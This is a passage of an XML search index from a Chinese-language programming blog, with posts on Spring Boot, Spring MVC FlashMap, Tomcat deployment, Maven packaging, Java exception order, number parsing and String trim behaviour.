Color.BLUE&#125;██████████████████$&#123;AnsiColor.BRIGHT_GREEN&#125;████████$&#123;AnsiColor.BLACK&#125;██████$&#123;AnsiColor.WHITE&#125;██$&#123;AnsiColor.MAGENTA&#125;██████████████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.WHITE&#125;██$&#123;AnsiColor.MAGENTA&#125;████$&#123;AnsiColor.WHITE&#125;████████████████$&#123;AnsiColor.MAGENTA&#125;████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.BRIGHT_BLUE&#125;██$&#123;AnsiColor.BLUE&#125;██████████████████████████████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.WHITE&#125;████$&#123;AnsiColor.MAGENTA&#125;██████████████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.WHITE&#125;██████$&#123;AnsiColor.BLACK&#125;████████████$&#123;AnsiColor.WHITE&#125;████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.BRIGHT_BLUE&#125;████$&#123;AnsiColor.BRIGHT_BLUE&#125;██████████████████$&#123;AnsiColor.BLUE&#125;████$&#123;AnsiColor.BLUE&#125;██████$&#123;AnsiColor.BLACK&#125;████$&#123;AnsiColor.WHITE&#125;██████$&#123;AnsiColor.MAGENTA&#125;██████████████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.WHITE&#125;██████████████████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.BRIGHT_BLUE&#125;██████$&#123;AnsiColor.BRIGHT_BLUE&#125;██████████████████████████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.WHITE&#125;██$&#123;AnsiColor.BLACK&#125;████$&#123;AnsiColor.WHITE&#125;████████████████████$&#123;AnsiColor.BLACK&#125;██████████████████$&#123;AnsiColor.BRIGHT_BLUE&#125;████████$&#123;AnsiColor.BRIGHT_BLUE&#125;████████████████████████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.WHITE&#125;██████$&#123;AnsiColor.BLACK&#125;████████████████████████████████$&#123;AnsiColor.WHITE&#125;██$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.BRIGHT_BLUE&#125;████████████$&#123;AnsiColor.BRIGHT_BLUE&#125;████████████████████████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.WHITE&#125;████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.BRIGHT_BLUE&#125;██$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.WHITE&#125;████$&#123;AnsiColor.BRIGHT_BLUE&#125;████████████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.WHITE&#125;████$&#123;AnsiColor.BLACK&#125;████$&#123;AnsiColor.WHITE&#125;████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.BRIGHT_BLUE&#125;████████████$&#123;AnsiColor.BRIGHT_BLUE&#125;████████████████████████$&#123;AnsiColor.BLACK&#125;██████$&#123;AnsiColor.BRIGHT_BLUE&#125;████$&#123;AnsiColor.BLACK&#125;██████$&#123;AnsiColor.BRIGHT_BLUE&#125;████████████$&#123;AnsiColor.BLACK&#125;██████$&#123;AnsiColor.BRIGHT_BLUE&#125;████$&#123;AnsiColor.BLACK&#125;██████$&#123;AnsiColor.BRIGHT_BLUE&#125;████████████████████████████████████████████████████████████████████████████████████████████$&#123;AnsiColor.BRIGHT_BLUE&#125;:: Meow :: Running Spring Boot $&#123;spring-boot.version&#125; :: \ö/$&#123;AnsiColor.BLACK&#125; 参考资料 Banner 生成器 jhipster 彩虹猫]]></content>
      <categories>
        <category>Java Web</category>
      </categories>
      <tags>
        <tag>Spring Boot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[获取FlashMap的3种方法]]></title>
    <url>%2Fposts%2FHow_to_get_FlashMap_in_Spring_MVC.html</url>
    <content type="text"><![CDATA[前言FlashMap 是传递重定向参数的时候要用到的一个类。 getAttributes(笨重, 不推荐)在源码 DispatcherServlet 的 doService 方法中注入了 FlashMap123456789101112// org.springframework.web.servlet.DispatcherServletpublic class DispatcherServlet extends FrameworkServlet &#123; @Override protected void doService(HttpServletRequest request, HttpServletResponse response) throws Exception &#123; FlashMap inputFlashMap = this.flashMapManager.retrieveAndUpdate(request, response); if (inputFlashMap != null) &#123; request.setAttribute("org.springframework.web.servlet.DispatcherServlet.INPUT_FLASH_MAP", Collections.unmodifiableMap(inputFlashMap)); &#125; request.setAttribute("org.springframework.web.servlet.DispatcherServlet.OUTPUT_FLASH_MAP", new FlashMap()); request.setAttribute("org.springframework.web.servlet.DispatcherServlet.FLASH_MAP_MANAGER", this.flashMapManager); &#125;&#125; 所以我们可以使用 getAttributes 获取1234567891011121314@Controllerpublic class DemoController &#123; @GetMapping("/redirect") public String redirect() &#123; FlashMap redirectAttributes = (FlashMap) ((ServletRequestAttributes) (RequestContextHolder.getRequestAttributes())) .getRequest().getAttribute("org.springframework.web.servlet.DispatcherServlet.OUTPUT_FLASH_MAP"); redirectAttributes.put("key", "value"); return "redirect:/demo"; &#125; @GetMapping("/demo") public String demo(Model model) &#123; return "view.jsp"; &#125;&#125; 通过 RequestContextUtils 获取Spring早已将上面的获取代码封装到 RequestContextUtils 中1234567891011121314151617181920@Controllerpublic class DemoController &#123; @GetMapping("/redirect") public String redirect(HttpServletRequest request) &#123; FlashMap redirectAttributes = RequestContextUtils.getOutputFlashMap(request); redirectAttributes.put("key", "value"); return "redirect:/demo"; &#125; @GetMapping("/demo") public String demo(Model model) &#123; return "view.jsp"; &#125;&#125;// org.springframework.web.servlet.support.RequestContextUtilspublic abstract class RequestContextUtils &#123; public static FlashMap getOutputFlashMap(HttpServletRequest request) &#123; return (FlashMap) request.getAttribute(DispatcherServlet.OUTPUT_FLASH_MAP_ATTRIBUTE); &#125;&#125; Spring MVC 在 Controller 注入形参123456789101112131415@Controllerpublic class DemoController &#123; @GetMapping("/redirect") public String redirect(RedirectAttributes redirectAttributes) &#123; // 和上面一样, 保存到 OUTPUT_FLASH_MAP 中 redirectAttributes.addFlashAttribute("key1", "value2"); // 不保存到 flashMap 中, 拼接到 url 中 redirectAttributes.addAttribute("key2", "value2"); return "redirect:/demo"; &#125; @GetMapping("/demo") public String demo(Model model) &#123; return "view.jsp"; &#125;&#125;]]></content>
      <categories>
        <category>Java Web</category>
      </categories>
      <tags>
        <tag>Spring MVC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Spring Boot在Tomcat上使用]]></title>
    <url>%2Fposts%2Fdeploy_Spring_Boot_project_with_Tomcat.html</url>
    <content type="text"><![CDATA[前言一般的教程都是直接运行main方法, 看似脱离了Tomcat运行实际上是使用的是内嵌的Tomcat123456@SpringBootApplicationpublic class App &#123; public static void main(String[] args) &#123; SpringApplication.run(App.class, args); &#125;&#125; 而且打包出来的是jar包, 虽然可以直接运行, 但是如果想放在外部的Tomcat下, 就不太好了。 解决方案是 继承 SpringBootServletInitializer 并重写 configure 方法 123456789101112@SpringBootApplication@Controllerpublic class App extends SpringBootServletInitializer &#123; @Override protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) &#123; // 可有可无的方法, 之后有解释 return builder.sources(getClass()); &#125; public static void main(String[] args) &#123; SpringApplication.run(App.class, args); &#125;&#125; 在项目的 pom.xml 设置 &lt;packaging&gt;war&lt;/packaging&gt;, 注意, 多模块项目只需要在该模块的 pom.xml 设置即可 添加spring-boot-starter-tomcat依赖, 并设置 &lt;scope&gt;provided&lt;/scope&gt; 12345&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt; &lt;scope&gt;provided&lt;/scope&gt;&lt;/dependency&gt; 打war包部署到Tomcat 为什么要 继承SpringBootServletInitializer ?首先明确一点, Spring Boot只是许多个Spring项目和其他项目整合起来, 并不是一个额外的项目, 你可以理解成一个封装了Spring、SpringMVC等项目的新项目。那么, Spring有入口ContextLoaderListener、 Spring MVC有入口DispatcherServlet。那Spring Boot的入口当然就是SpringBootServletInitializer。(当然如果你不用war包可以忽略这段话, 也不用看这篇文章) 看到熟悉的ServletInitializer, 这是Servlet3.0新特性, Tomcat会自动查找并运行实现了 ServletContainerInitializer 接口的类。但是能自动加载的是 ServletContainerInitializer 及其子类, 和SpringBootServletInitializer及其父类WebApplicationInitializer可是丝毫没有联系的, 能想到的就是有另一个类连接了这两个类。这个类就是SpringServletContainerInitializer, 它会去加载所有的WebApplicationInitializer及其子类SpringBootServletInitializer。1234567891011121314151617181920212223// org.springframework.web.SpringServletContainerInitializer@HandlesTypes(WebApplicationInitializer.class)// 继承了 ServletContainerInitializer , 所以能自动加载public class SpringServletContainerInitializer implements ServletContainerInitializer &#123; @Override // 1. 扫描HandlesTypes注解中的类或它的子类, 注入Set集合 public void onStartup(Set&lt;Class&lt;?&gt;&gt; webAppInitializerClasses, ServletContext servletContext) throws ServletException &#123; List&lt;WebApplicationInitializer&gt; initializers = new LinkedList&lt;WebApplicationInitializer&gt;(); for (Class&lt;?&gt; waiClass : webAppInitializerClasses) &#123; if (!waiClass.isInterface() &amp;&amp; !Modifier.isAbstract(waiClass.getModifiers()) &amp;&amp; WebApplicationInitializer.class.isAssignableFrom(waiClass)) &#123; initializers.add((WebApplicationInitializer) waiClass.newInstance()); &#125; &#125; AnnotationAwareOrderComparator.sort(initializers); for (WebApplicationInitializer initializer : initializers) &#123; // 2. 核心方法, 调用WebApplicationInitializer的onStartup方法 initializer.onStartup(servletContext); &#125; &#125;&#125; HandlesTypes 注解中的 WebApplicationInitializer 被注入到 Set集合中, 然后调用 WebApplicationInitializer的onStartup方法。至此, SpringBootServletInitializer 已经能随着Tomcat的启动而启动了。 为什么不用重写configure方法很多网上的文章, 都说要重写 configure方法, 但是这对我上面那个Hello world例子是不需要的, 从源码中可以窥视一二。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162// org.springframework.boot.web.support.SpringBootServletInitializer// 实现了 WebApplicationInitializer 接口, 所以也能间接的自动加载public abstract class SpringBootServletInitializer implements WebApplicationInitializer &#123; // 省略部分代码 @Override public void onStartup(ServletContext servletContext) throws ServletException &#123; // 1. 入口 WebApplicationContext rootAppContext = createRootApplicationContext(servletContext); if (rootAppContext != null) &#123; // 由于 application context 已被初始化，因此无操作 // 这里加载了 ContextLoaderListener , 所以也不能自己再去实现 ContextLoaderListener servletContext.addListener(new ContextLoaderListener(rootAppContext) &#123; @Override public void contextInitialized(ServletContextEvent event) &#123; &#125; &#125;); &#125; &#125; // 2. 创建 ApplicationContext protected WebApplicationContext createRootApplicationContext(ServletContext servletContext) &#123; // 设计模式 之 建造器Builder模式 SpringApplicationBuilder builder = createSpringApplicationBuilder(); builder.main(getClass()); ApplicationContext parent = getExistingRootWebApplicationContext(servletContext); if (parent != null) &#123; this.logger.info("Root context already created (using as parent)."); servletContext.setAttribute( WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE, null); builder.initializers(new ParentContextApplicationContextInitializer(parent)); &#125; builder.initializers( new ServletContextApplicationContextInitializer(servletContext)); builder.listeners(new ServletContextApplicationListener(servletContext)); builder.contextClass(AnnotationConfigEmbeddedWebApplicationContext.class); // 调用 configure 方法, 默认不操作builder builder = configure(builder); SpringApplication application = builder.build(); // 如果没有重写 configure 方法给 builder 添加 source // 即 application 的 source(Set集合) 为空 if (application.getSources().isEmpty() &amp;&amp; AnnotationUtils .findAnnotation(getClass(), Configuration.class) != null) &#123; // 且继承 SpringBootServletInitializer 自身的子类添加了 Configuration 注解 // 因为 SpringBootApplication 注解继承了 Configuration 注解 // 所以不用重写 configure方法 也可以加入 source 中 application.getSources().add(getClass()); &#125; Assert.state(!application.getSources().isEmpty(), "No SpringApplication sources have been defined. Either override the " + "configure method or add an @Configuration annotation"); // Ensure error pages are registered if (this.registerErrorPageFilter) &#123; application.getSources().add(ErrorPageFilterConfiguration.class); &#125; return run(application); &#125; // 默认不操作builder protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) &#123; return builder; &#125;&#125; 从Configuration注解的类可以注入 source 发现, 这个 source 就是存储Spring配置的, 当然, 不是xml, 而是java配置。也就是说 只有一个Java配置类, 则直接继承 SpringBootServletInitializer 即可。 如果有多个Java配置类, 则继承 SpringBootServletInitializer 之外，还要重写 configure 方法, 将配置类都注入进去, 包括 SpringBootServletInitializer 的子类。]]></content>
      <categories>
        <category>Java Web</category>
      </categories>
      <tags>
        <tag>Spring Boot</tag>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Tomcat部署外部应用最佳实践]]></title>
    <url>%2Fposts%2FBest_Practices_of_deploys_Outside_Application_with_Tomcat.html</url>
    <content type="text"><![CDATA[前言Tomcat有一个扩展点, 可以配置环境变量Tomcat 8.5\bin\setenv.sh, 如果没有可以手动创建。 Windows用 bat 后缀 Linux用 sh 后缀 配置setenv.bat在 Tomcat\bin 目录下新建 setenv.bat文件。输入如下配置123set JAVA_HOME=D:\Java\jdk1.8.0_112(替换为jdk的路径)set JAVA_OPTS=-Xmx512mset TITLE=自定义的标题 配置ahao.xml在 Tomcat\conf\Catalina\localhost 目录下(没有则创建), 创建 ahao.xml 文件。输入如下配置1234&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;Context path="/" docBase="F:\ahao" reloadable="true" privileged="true"&gt;&lt;/Context&gt; docBase 是 war 包的解压路径。通俗讲, 就是包含子目录为 WEB-INF 、 META-INF 的一个目录。 运行打开 Tomcat\bin\startup.bat 即可。输入 http://localhost:8080/ahao 。这里的项目名就是之前配置的 xml 的名称。 原理在catalina.sh文件中会自动载入环境变量12345if [ -r "$CATALINA_BASE/bin/setenv.sh" ]; then . "$CATALINA_BASE/bin/setenv.sh"elif [ -r "$CATALINA_HOME/bin/setenv.sh" ]; then . "$CATALINA_HOME/bin/setenv.sh"fi]]></content>
      <categories>
        <category>Java Web</category>
      </categories>
      <tags>
        <tag>最佳实践</tag>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Tomcat部署web项目的3种方法]]></title>
    <url>%2Fposts%2FThe_ways_of_deploy_Web_project_with_Tomcat.html</url>
    <content type="text"><![CDATA[内部应用直接把war包复制粘贴到 Tomcat 8.5\webapps目录下, 然后执行 Tomcat 8.5\bin\startup.bat即可。 外部应用 docBase: 项目文件夹实际的位置, 子目录为 WEB-INF 、 META-INF 的一个目录。 path: 虚拟路径, 浏览器访问本项目的路径, 上面例子为 http://本机地址:端口/hello 配置server.xml打开 Tomcat 8.5\conf\server.xml, 在 &lt;Host&gt; 标签插入 &lt;Context&gt; 标签。12345678910&lt;Service name="Catalina"&gt;&lt;Engine name="Catalina" defaultHost="localhost"&gt; &lt;Host name="localhost" appBase="webapps" unpackWARs="true" autoDeploy="true"&gt; &lt;!-- &lt;Context path="url路径名" docBase="实际项目在磁盘中地址" /&gt; --&gt; &lt;Context path="/hello" docBase="项目路径" reloadable="true" privileged="true"&gt; &lt;/Context&gt; &lt;/Host&gt;&lt;/Engine&gt;&lt;/Service&gt; 配置test.xml打开 Tomcat 8.5\conf\Catalina\localhost, 没有则自己创建目录, 新建一个 test.xml 文件。访问路径为 http://localhost:8080/test123&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;Context path="/" docBase="项目路径" reloadable="true" privileged="true"&gt;&lt;/Context&gt; 参考资料 tomcat部署web项目的3种方法]]></content>
      <categories>
        <category>Java Web</category>
      </categories>
      <tags>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[maven打包war包时出现了pom不存在的jar包]]></title>
    <url>%2Fposts%2Fmaven_will_import_WEB-INF_lib_jar_to_war.html</url>
    <content type="text"><![CDATA[标题是有点绕。这几天在搞一个 SpringBoot 的短信项目, 在打包 war 包的时候,发现war包中的 commons-lang 包有两个版本, 一个 1.0.1 , 一个 2.6 。在 pom.xml 中我只导入了 2.6 的版本, 那么 1.0.1 的jar包是从哪来的呢? 先说结论maven 的 package 命令会把 WEB-INF/lib 中的jar包也打包进war包中。 排错 首先先看maven的依赖, 使用的是IDEA。点击 View -&gt; Tool Windows -&gt; Maven Projects, 在右边出现的窗口, 点击 Show Dependencies。点击Alt可以打开放大镜。并没有找到commons-lang 1.0.1。 接下来把pom.xml的依赖全部注释掉, 只留下 spring-boot-starter-web运行Hello world 成功。打包, 还是发现了commons-lang 1.0.1。 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;/dependency&gt; 手动排除commons-lang, 打包, 还是有commons-lang 1.0.1。 12345678910&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;commons-lang&lt;/groupId&gt; &lt;artifactId&gt;commons-lang&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt;&lt;/dependency&gt; 发现war包的commons-lang 1.0.1是在WEB-INF/lib下的于是在src/main/webapp/WEB-INF/lib下, 果然发现了commons-lang 1.0.1的包 结论maven 的 package 命令会把 WEB-INF/lib 中的jar包也会打包进war包中。]]></content>
      <categories>
        <category>Maven</category>
      </categories>
      <tags>
        <tag>Maven</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java异常捕捉顺序]]></title>
    <url>%2Fposts%2FThe_capture_order_of_Java_Exception.html</url>
    <content type="text"><![CDATA[前言一直对异常捕捉都是e.printStackTrace()就完事了, 突然对异常捕捉顺序很好奇, 就做了个测试, 直接看代码。 从小到大捕捉1234567891011121314151617181920public class MyTest &#123; @Test public void test()&#123; try&#123; throw new FileNotFoundException("文件没找到"); &#125; catch (FileNotFoundException e)&#123; // 结果输出 ` FileNotFoundException ` System.out.println("FileNotFoundException "); &#125; catch (IOException e)&#123; // 不执行, 已被FileNotFoundException捕捉 System.out.println("IOException"); &#125; catch (Exception e)&#123; // 不执行, 已被FileNotFoundException捕捉 System.out.println("Exception "); &#125; catch (Throwable e)&#123; // 不执行, 已被FileNotFoundException捕捉 System.out.println("Throwable "); &#125; &#125;&#125; 从大到小捕捉12345678910111213141516171819public class MyTest &#123; @Test public void test()&#123; try&#123; throw new FileNotFoundException("文件没找到"); &#125; catch (Throwable e)&#123; System.out.println("Throwable "); &#125; catch (FileNotFoundException e)&#123; // 编译错误, 提示异常已被 Throwable 捕捉 System.out.println("FileNotFoundException "); &#125; catch (IOException e)&#123; // 编译错误, 提示异常已被 Throwable 捕捉 System.out.println("IOException"); &#125; catch (Exception e)&#123; // 编译错误, 提示异常已被 Throwable 捕捉 System.out.println("Exception "); &#125; &#125;&#125; 结论Java异常捕捉顺序是 从上到下 从小到大]]></content>
      <categories>
        <category>Java SE</category>
      </categories>
      <tags>
        <tag>Exception</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[解析String为数字用valueOf还是parseXxx?]]></title>
    <url>%2Fposts%2FvalueOf_method_and_parseXxx_method.html</url>
    <content type="text"><![CDATA[前言findBuds真是一个好插件, 找到了许多平时都不知道的高危bug。在我解析字符串时1234@Overridepublic long getLong(String key) &#123; return Long.valueOf(key == null ? "0" : key.toString());&#125; 给我爆了这个警告12Boxing/unboxing to parse a primitiveA boxed primitive is created from a String, just to extract the unboxed primitive value. It is more efficient to just call the static parseXXX method. 意思是一个包装类由字符串创建, 只是为了获取基本数据类型的值, 调用parseXxx更有效。 两个方法的返回值不同jdk7提供的自动拆装箱语法糖是很不错的。但是过份依赖语法糖就会出现一些 常识性 问题。两个方法如下12public static long parseLong(String s);public static Long valueOf(String s); 先说结论 要获取基本数据类型就使用 parseXxx 要获取包装数据类型就使用 valueOf 看返回类型就知道了, 滥用会导致一些性能问题, 毕竟拆装箱多了一步操作。 源码分析我们先看 valueOf 的源码123456789101112131415// java.lang.Longpublic final class Long extends Number implements Comparable&lt;Long&gt; &#123; public static Long valueOf(String s) throws NumberFormatException &#123; // 调用 parseLong 方法解析字符串 return Long.valueOf(parseLong(s, 10)); &#125; public static Long valueOf(long l) &#123; final int offset = 128; if (l &gt;= -128 &amp;&amp; l &lt;= 127) &#123; // 从缓存中获取 return LongCache.cache[(int)l + offset]; &#125; return new Long(l); &#125;&#125; 很明显 valueOf 是调用了 parseLong 方法的。所以这个解析字符串的实现是交由 parseLong 完成的。然后再从 缓存 中获取, 缓存中没有这个值的话, 再去 new 一个。 再看 parseLong 方法。在此之前, 先复习下进制转换的算法。下面的算法公式为这项算法是秦九韶公式简单的说, 就是降低了多项式的计算复杂度(叹服古人的智慧, 居然应用到计算机领域) 为了避免溢出, 是基于 负数 进行运算的。123456789101112131415161718192021222324252627282930313233343536373839404142434445// java.lang.Longpublic final class Long extends Number implements Comparable&lt;Long&gt; &#123; public static long parseLong(String s, int radix) throws NumberFormatException &#123; // 省略抛出异常的代码 long result = 0; // 结果值 boolean negative = false; // 是否为负数 int i = 0, len = s.length(); // i 为字符串下标, len为字符串长度 long limit = -Long.MAX_VALUE; // long multmin; // int digit; // 进制 // 获取第一个字符 char firstChar = s.charAt(0); if (firstChar &lt; '0') &#123; // 非数字和字母 if (firstChar == '-') &#123; // 判断是否为负号 negative = true; // 标记为负数 limit = Long.MIN_VALUE; &#125; else if (firstChar != '+')&#123; // 不是数字, 不是字母, 不是负号, 不是正号, 那肯定不是数字 throw NumberFormatException.forInputString(s); &#125; if (len == 1) &#123; // 字符串长度为1, 则只有一个符号, 不能解析 throw NumberFormatException.forInputString(s); &#125; i++; // 下标移到下一个字符 &#125; multmin = limit / radix; // 设定不同进制下的极限值 while (i &lt; len) &#123; // Accumulating negatively avoids surprises near MAX_VALUE // 负数运算避免大于MAX_VALUE发生溢出 digit = Character.digit(s.charAt(i++),radix); // 获取radix进制下的值, 5=&gt;5, A=&gt;10 // 秦九韶公式的核心算法 result *= radix; result -= digit; &#125; // 最后把负数转为正数(或者负数转为正数) return negative ? result : -result; &#125;&#125;]]></content>
      <categories>
        <category>Java SE</category>
      </categories>
      <tags>
        <tag>最佳实践</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Spring MVC返回json乱码]]></title>
    <url>%2Fposts%2Fhow_to_correctly_parsing_json_in_Spring_MVC.html</url>
    <content type="text"><![CDATA[前言json又双叒叕返回乱码了!乱码一般都是编码问题，比如一个字符串你好世界, 用GBK编码后, 再用UTF-8解码, 就会出现乱码问题。 样例12345678@Controllerpublic class TestController&#123; @GetMapping("/test") @ResponseBody public String test() &#123; return "你好世界"; &#125;&#125; 使用CharacterEncodingFilter过滤器(没用)在 web.xml 中加入CharacterEncodingFilter过滤器, 对request和response进行编码转换。1234567891011121314151617181920&lt;filter&gt; &lt;filter-name&gt;encoding&lt;/filter-name&gt; &lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;/filter-class&gt; &lt;init-param&gt; &lt;param-name&gt;encoding&lt;/param-name&gt; &lt;param-value&gt;UTF-8&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;forceRequestEncoding&lt;/param-name&gt; &lt;param-value&gt;true&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;forceResponseEncoding&lt;/param-name&gt; &lt;param-value&gt;true&lt;/param-value&gt; &lt;/init-param&gt;&lt;/filter&gt;&lt;filter-mapping&gt; &lt;filter-name&gt;encoding&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt; 源码很简单, 就是调用setCharacterEncoding方法设置编码123456789101112131415161718public class CharacterEncodingFilter extends OncePerRequestFilter &#123; @Override protected void doFilterInternal( HttpServletRequest request, HttpServletResponse response, FilterChain filterChain) throws ServletException, IOException &#123; String encoding = getEncoding(); if (encoding != null) &#123; if (isForceRequestEncoding() || request.getCharacterEncoding() == null) &#123; request.setCharacterEncoding(encoding); &#125; if (isForceResponseEncoding()) &#123; response.setCharacterEncoding(encoding); &#125; &#125; filterChain.doFilter(request, response); &#125;&#125; CV大法重写StringHttpMessageConverter类行吧, 自己解决不了, 上stackoverflow看看,在使用&lt;mvc:annotation-driven /&gt;自动驱动的前提下,发现@ResponseBody返回值是String类型的话。会调用StringHttpMessageConverter这个类进行转换。12345public class StringHttpMessageConverter extends AbstractHttpMessageConverter&lt;String&gt; &#123; public static final Charset DEFAULT_CHARSET = Charset.forName("ISO-8859-1"); private volatile List&lt;Charset&gt; availableCharsets; private boolean writeAcceptCharset = true;&#125; 默认是ISO-8859-1编码, 而且是final修饰的。这就意味这不能继承这个方法了。那就用CV大法吧。12345public class StringHttpMessageConverter extends AbstractHttpMessageConverter&lt;String&gt; &#123; public static final Charset DEFAULT_CHARSET = Charset.forName("UTF-8"); private volatile List&lt;Charset&gt; availableCharsets; private boolean writeAcceptCharset = true;&#125; 并且在&lt;mvc:annotation-driven /&gt;内注入这个Bean12345&lt;mvc:annotation-driven&gt; &lt;mvc:message-converters register-defaults="true"&gt; &lt;bean class="com.chuanliu.platform.activity.basic.converter.MyStringHttpMessageConverter"/&gt; &lt;/mvc:message-converters&gt; &lt;/mvc:annotation-driven&gt; 使用produces属性完成使用CV大法是很不好的习惯,【解决spring-mvc @responseBody注解返回json 乱码问题】这篇文章提出可以使用produces属性完成12345678@Controllerpublic class TestController&#123; @GetMapping(value = "/test", produces="text/html;charset=UTF-8") @ResponseBody public String test() &#123; return "你好世界"; &#125;&#125; 省了一大堆配置, 但还是要在每个@ResponseBody方法使用CV大法, 写入produces=&quot;text/html;charset=UTF-8&quot;。 直接返回对象【（二）Java 中文乱码学习 与Spring @ResponseBody中的乱码 - Spring @ResponseBody中的乱码】中提到在使用&lt;mvc:annotation-driven /&gt;自动驱动的前提下,如果直接返回String类型, 则会调用StringHttpMessageConverter。如果直接返回对象类型, 则会调用MappingJackson2HttpMessageConverter。 在MappingJackson2HttpMessageConverter的父类AbstractJackson2HttpMessageConverter中。可以看到使用了UTF-8编码。123public abstract class AbstractJackson2HttpMessageConverter extends AbstractGenericHttpMessageConverter&lt;Object&gt; &#123; public static final Charset DEFAULT_CHARSET = Charset.forName("UTF-8");&#125; 参考资料 解决spring-mvc @responseBody注解返回json 乱码问题 （二）Java 中文乱码学习 与Spring @ResponseBody中的乱码 - Spring @ResponseBody中的乱码中提到 springmvc 4.x 处理json 数据时中文乱码]]></content>
      <categories>
        <category>Java Web</category>
      </categories>
      <tags>
        <tag>Spring MVC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[trim为什么失效了]]></title>
    <url>%2Fposts%2FWhy_did_trim_fail_execute.html</url>
    <content type="text"><![CDATA[前言一直以为String#trim()是去掉字符串两边空格的。但是以下代码却与预期不同。1234System.out.println("测试:["+"820000 ".trim()+"]"); // ASCII码 160 的空格System.out.println("测试:["+" 市辖区"+"]"); // ASCII码 12288 的空格// 测试:[820000 ]// 测试:[ 市辖区] 这段数字加空格是我从最新县及县以上行政区划代码爬取的。 查看源码很明显, 算法就是 从前往后, 找到第一个非空格的字符 从后往前, 找到第一个非空格的字符 使用substring截取字符串 substring使用构造复制函数进行拷贝12345678910111213141516171819public String trim() &#123; int len = value.length; int st = 0; char[] val = value; /* avoid getfield opcode */ while ((st &lt; len) &amp;&amp; (val[st] &lt;= ' ')) &#123; st++; &#125; while ((st &lt; len) &amp;&amp; (val[len - 1] &lt;= ' ')) &#123; len--; &#125; return ((st &gt; 0) || (len &lt; value.length)) ? substring(st, len) : this;&#125;public String substring(int beginIndex, int endIndex) &#123; int subLen = endIndex - beginIndex; return ((beginIndex == 0) &amp;&amp; (endIndex == value.length)) ? this : new String(value, beginIndex, subLen);&#125; 明显没毛病, 要我写我也差不多是这样写。 断点调试给trim加上断点, 保险起见, 每条语句加上断点。12345678910111213public String trim() &#123;· int len = value.length;· int st = 0;· char[] val = value; /* avoid getfield opcode */·· while ((st &lt; len) &amp;&amp; (val[st] &lt;= ' ')) &#123;· st++;· &#125;· while ((st &lt; len) &amp;&amp; (val[len - 1] &lt;= ' ')) &#123;· len--;· &#125;· return ((st &gt; 0) || (len &lt; value.length)) ? substring(st, len) : this;&#125; 调试结果如下, 代码走到第9行, 进不去这个while。那明显是(val[len - 1] &lt;= &#39; &#39;)出了问题。1234567891011121314len (slot_1) = 10st (slot_2) = 0value = &#123; 0 = &apos;8&apos; 56 1 = &apos;2&apos; 50 2 = &apos;0&apos; 48 3 = &apos;0&apos; 48 4 = &apos;0&apos; 48 5 = &apos;0&apos; 48 6 = &apos; &apos; 160 7 = &apos; &apos; 160 8 = &apos; &apos; 160 9 = &apos; &apos; 160&#125; 这时候注意value[9]的ASCII码为160。查阅ASCII码表可以知道, 空格的ASCII码应该为32。可是这明显是空格啊! 为什么是160呢! 为什么眼见不为实web中有一个常识是, 要使用连续空格, 必须使用&amp;nbsp;。如果只按住space输入空格的话, 会被压缩为一个空格。 很明显, 这个&amp;nbsp;的ASCII码就是160。而trim方法只判断了ASCII码为32的空格。就算是apache的StringUtils#trim(), 底层也是调用String#trim()的。 后来还发现了一个ASCII码为12288的空格, 一个汉字宽度的空格。 自己动手丰衣足食参考源码, 进行改造12345678910111213141516171819202122232425262728293031323334public class StringHelper&#123; /** * 去除字符串首尾空格 * 32 为 普通空格 * 160 为 html的空格 &amp;nbsp; * 12288 为 一个汉字宽度的空格 * @param str * @return */ public static String trim(String str) &#123; if (str == null) &#123; return null; &#125; char[] val = str.toCharArray(); int len = val.length; int st = 0; while ((st &lt; len) &amp;&amp; StringUtils.equalsAny(val[st] + "", (char) (32) + "", (char) (160) + "", (char) (12288) + "")) &#123; st++; &#125; while ((st &lt; len) &amp;&amp; 